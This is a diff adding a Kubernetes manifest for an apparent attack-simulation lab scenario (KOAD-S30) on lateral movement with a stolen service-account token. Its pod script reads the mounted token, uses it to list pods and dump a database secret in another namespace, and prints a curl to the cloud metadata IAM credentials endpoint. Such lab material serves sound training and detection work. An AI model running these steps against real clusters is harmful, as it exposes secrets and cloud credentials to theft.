@@ -1,0 +1,81 @@
+# KOAD-S30: Lateral Movement with Stolen Token
+# ATT&CK: T1550 — Use Alternate Authentication Material
+# Attack: Use stolen SA token to access other Namespaces / cloud resources
+---
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: koad-production
+  labels:
+    koad-scenario: S30
+---
+apiVersion: v1
+kind: Secret
+metadata:
+  name: production-db-creds
+  namespace: koad-production
+  labels:
+    koad-scenario: S30
+type: Opaque
+data:
+  host: cHJvZC1kYi5leGFtcGxlLmNvbQ==
+  username: cHJvZF9hZG1pbg==
+  password: UHIwZF9TdXBlclNlY3JldCE=
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: production-app
+  namespace: koad-production
+  labels:
+    app: production-app
+    koad-scenario: S30
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: production-app
+  template:
+    metadata:
+      labels:
+        app: production-app
+    spec:
+      containers:
+        - name: app
+          image: nginx:1.27-alpine
+          ports:
+            - containerPort: 80
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: lateral-mover
+  namespace: koad
+  labels:
+    koad-scenario: S30
+    mitre-attck: T1550
+spec:
+  serviceAccountName: overprivileged-sa
+  containers:
+    - name: mover
+      image: bitnami/kubectl:latest
+      command: ["sh", "-c"]
+      args:
+        - |
+          echo "=== KOAD-S30: Lateral Movement via Stolen Token ==="
+          echo ""
+          echo "Step 1: Steal SA token from current Pod"
+          TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+          echo "Token: ${TOKEN:0:30}..."
+          echo ""
+          echo "Step 2: Access other namespace with stolen token"
+          kubectl --token="$TOKEN" get pods -n koad-production 2>/dev/null
+          echo ""
+          echo "Step 3: Read production secrets"
+          kubectl --token="$TOKEN" get secret production-db-creds -n koad-production -o yaml 2>/dev/null
+          echo ""
+          echo "Step 4: Access cloud metadata (if in cloud)"
+          echo "  curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+          echo ""
+          echo "Lateral movement complete."
+          sleep infinity
